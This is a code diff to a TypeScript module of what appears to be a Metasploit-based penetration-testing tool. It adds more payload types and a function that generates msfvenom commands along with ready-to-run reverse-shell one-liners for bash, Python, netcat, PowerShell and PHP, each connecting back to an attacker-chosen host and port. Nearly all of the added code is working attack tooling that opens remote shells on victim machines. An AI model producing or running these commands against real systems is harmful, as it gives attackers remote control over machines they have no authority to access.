@@ -35,15 +35,98 @@ export type MsfSessionType = typeof MsfSessionType.Type;
 
 export const PayloadType = Schema.Literals([
   "windows/meterpreter/reverse_tcp",
+  "windows/x64/meterpreter/reverse_tcp",
   "windows/shell/reverse_tcp",
   "linux/x86/meterpreter/reverse_tcp",
   "linux/x86/shell/reverse_tcp",
+  "linux/x64/meterpreter/reverse_tcp",
+  "linux/x64/shell/reverse_tcp",
   "java/meterpreter/reverse_tcp",
   "php/meterpreter/reverse_tcp",
   "cmd/unix/reverse_bash",
   "generic/shell_reverse_tcp",
 ]);
 export type PayloadType = typeof PayloadType.Type;
+
+// ─── Payload Command Generation ────────────────────────────────────────────
+
+const PAYLOAD_FORMAT_MAP: Record<string, { ext: string; format: string }> = {
+  "windows/meterpreter/reverse_tcp": { ext: "exe", format: "exe" },
+  "windows/x64/meterpreter/reverse_tcp": { ext: "exe", format: "exe" },
+  "windows/shell/reverse_tcp": { ext: "exe", format: "exe" },
+  "linux/x86/meterpreter/reverse_tcp": { ext: "elf", format: "elf" },
+  "linux/x86/shell/reverse_tcp": { ext: "elf", format: "elf" },
+  "linux/x64/meterpreter/reverse_tcp": { ext: "elf", format: "elf" },
+  "linux/x64/shell/reverse_tcp": { ext: "elf", format: "elf" },
+  "java/meterpreter/reverse_tcp": { ext: "jar", format: "jar" },
+  "php/meterpreter/reverse_tcp": { ext: "php", format: "raw" },
+  "generic/shell_reverse_tcp": { ext: "elf", format: "elf" },
+};
+
+export interface PayloadCommand {
+  label: string;
+  command: string;
+}
+
+/**
+ * Generate msfvenom command and common one-liners for a given payload configuration.
+ */
+export function generatePayloadCommands(
+  payload: PayloadType,
+  lhost: string,
+  lport: number,
+): PayloadCommand[] {
+  const commands: PayloadCommand[] = [];
+  const host = lhost === "0.0.0.0" ? "<YOUR_IP>" : lhost;
+
+  // msfvenom command
+  const fmt = PAYLOAD_FORMAT_MAP[payload];
+  if (fmt) {
+    commands.push({
+      label: "msfvenom",
+      command: `msfvenom -p ${payload} LHOST=${host} LPORT=${lport} -f ${fmt.format} -o payload.${fmt.ext}`,
+    });
+  }
+
+  // Common one-liners
+  if (payload === "cmd/unix/reverse_bash" || payload.startsWith("linux/")) {
+    commands.push({
+      label: "Bash reverse shell",
+      command: `bash -i >& /dev/tcp/${host}/${lport} 0>&1`,
+    });
+    commands.push({
+      label: "Python reverse shell",
+      command: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${host}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+    });
+    commands.push({
+      label: "Netcat reverse shell",
+      command: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${lport} >/tmp/f`,
+    });
+  }
+
+  if (payload.startsWith("windows/")) {
+    commands.push({
+      label: "PowerShell reverse shell",
+      command: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${host}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
+    });
+  }
+
+  if (payload === "php/meterpreter/reverse_tcp") {
+    commands.push({
+      label: "PHP reverse shell",
+      command: `php -r '$sock=fsockopen("${host}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+    });
+  }
+
+  if (payload === "java/meterpreter/reverse_tcp") {
+    commands.push({
+      label: "Java reverse shell",
+      command: `java -jar payload.jar`,
+    });
+  }
+
+  return commands;
+}
 
 export const ListenerConfig = Schema.Struct({
   listenerId: TrimmedNonEmptyString,
